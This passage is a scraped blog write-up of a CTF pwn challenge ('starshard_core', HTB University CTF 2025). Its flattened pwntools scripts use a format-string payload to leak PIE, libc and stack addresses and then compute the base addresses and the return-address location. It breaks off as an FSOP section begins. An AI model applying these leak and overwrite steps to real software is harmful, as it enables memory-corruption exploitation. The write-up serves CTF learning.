@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://medoabd.github.io/MyBlog/posts/htb_uni_ctf_25/htb-university-ctf-2025---pwn-writeup/
+CHALLENGE: HTB University CTF 2025 - Pwn Writeup - Med's Blog
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Hard
+PROTECTIONS: PIE
+KEY_FUNCTIONS: None
+KEY_TECHNIQUE: Writeup for HTB University CTF 2025 - Pwn Writeup - Med's Blog — other exploitation technique.
+---
+2 3 elf = context.binary = ELF( './starshard_core' , False ) 4 libc = ELF( './glibc/libc.so.6' , False ) 5 p = elf.process() 6 7 pl = b '%11$p%16$p%9$p' 8 p.sendline(pl) 9 10 gdb.attach(p, gdbscript = 'b main,c' ) 11 p.interactive() We get the following output: Tinselwick Tinkerer Name: === Welcome 0x55d1bd19775e0x7ffc709a0b180x7fb84e42dfd0 — Starshard Console === We inspect those addresses in gdb: The pie address corresponds to main , the libc address corresponds to __libc_start_call_main+128 and the other one is a stack address. Since the offsets of main and __libc_start_call_main+128 are known from the binary and libc respectively, we can recover the base addresses: PIE base = leaked_main_addr - offset_of_main_in_binary Libc base = leaked_libc_addr - (offset_of___libc_start_call_main + 128) For the return address, we can use telescope $rsp -l 50 to see the stack layout and find the main return address. By calculating the difference between the leaked stack address and the return address location, we obtain the offset needed to target the return address for overwriting.. gef➤ p/x 0x7ffc709a0b18 - 0x00007ffc709a09f8 $1 = 0x120 We calculate the needed addresses using this script: 1 from pwn import * 2 3 elf = context.binary = ELF( './starshard_core' , False ) 4 libc = ELF( './glibc/libc.so.6' , False ) 5 p = elf.process() 6 7 pl = b '%11$p%16$p%9$p' 8 p.sendline(pl) 9 p.recvuntil( b 'Welcome ' ) 10 s = p.recvline() 11 pie_addr, stack_addr, libc_addr = s[: 14 ], s[ 14 : 28 ], s[ 28 : 42 ] 12 13 libc.address = int (libc_addr, 16 ) - (libc.symbols[ '__libc_start_call_main' ] + 128 ) 14 elf.address = int (pie_addr, 16 ) - elf.sym.main 15 main_ret_addr = int (stack_addr, 16 ) - 0x 120 16 17 log.success( f 'base addr: {hex (elf.address) } ' ) 18 log.success( f 'libc base addr: {hex (libc.address) } ' ) 19 log.success( f 'main ret addr: {hex (main_ret_addr) } ' ) Understanding FSOP # Before we execute the final payload, it is crucial to understand FSOP (File Structure Orie
